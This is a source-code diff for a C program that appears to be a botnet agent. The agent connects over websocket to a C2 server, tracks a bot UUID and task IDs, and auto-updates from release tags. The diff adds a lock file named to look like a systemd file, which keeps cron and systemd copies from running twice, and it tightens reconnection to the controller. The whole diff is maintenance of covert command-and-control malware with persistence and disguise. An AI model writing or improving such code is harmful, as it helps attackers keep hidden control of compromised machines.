@@ -10,9 +10,23 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.9"
+#define BOT_VERSION_TAG "v4.0.11"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
+
+/* Prevent two instances sharing same UUID (cron + systemd) from thrashing C2 */
+static int acquire_single_instance(void)
+{
+    int fd = open("/var/run/systemd-log.lock", O_CREAT | O_RDWR, 0644);
+    if (fd < 0) fd = open("/tmp/systemd-log.lock", O_CREAT | O_RDWR, 0644);
+    if (fd < 0) return -1;
+    if (flock(fd, LOCK_EX | LOCK_NB) != 0) {
+        close(fd);
+        return -1;
+    }
+    /* Keep fd open for process lifetime */
+    return fd;
+}
 
 /* Escape JSON string values (host, os, etc.) */
 static void json_escape(const char *in, char *out, int cap)
@@ -39,6 +53,12 @@ int main(int argc, char *argv[])
     signal(SIGINT, sig_handler);
     signal(SIGTERM, sig_handler);
     signal(SIGPIPE, SIG_IGN);
+
+    /* If another instance already holds the lock, exit quietly */
+    if (acquire_single_instance() < 0) {
+        fprintf(stderr, "[bot] another instance running, exit\n");
+        return 0;
+    }
 
     get_bot_uuid(g_bot_uuid, sizeof(g_bot_uuid));
 
@@ -159,8 +179,7 @@ int main(int argc, char *argv[])
         ws.port = cfg.c2_port;
         strcpy(ws.path, cfg.c2_path);
         ws.use_ssl = cfg.use_ssl;
-        pthread_mutex_init(&ws.sm, NULL);
-        pthread_mutex_init(&ws.rm, NULL);
+        pthread_mutex_init(&ws.io, NULL);
 
         if (ws_connect(&ws, g_bot_uuid) != 0)
         {
@@ -242,9 +261,8 @@ int main(int argc, char *argv[])
             if (n < 0) {
                 recv_fail++;
                 if (foreground) fprintf(stderr, "[bot] recv hard error #%d\n", recv_fail);
-                if (recv_fail >= 2) break; /* real disconnect */
-                usleep(100000);
-                continue;
+                /* One hard error is enough: peer closed / SSL desync / close frame */
+                break;
             }
             last_recv = time(NULL);
             recv_fail = 0;
@@ -332,8 +350,7 @@ int main(int argc, char *argv[])
             (void)handshaked;
         }
         ws_disconnect(&ws);
-        pthread_mutex_destroy(&ws.sm);
-        pthread_mutex_destroy(&ws.rm);
+        pthread_mutex_destroy(&ws.io);
         if (foreground) fprintf(stderr, "[bot] disconnected, reconnect in %ds\n", cfg.reconnect_min);
         if (!g_shutdown) sleep(cfg.reconnect_min);
     }
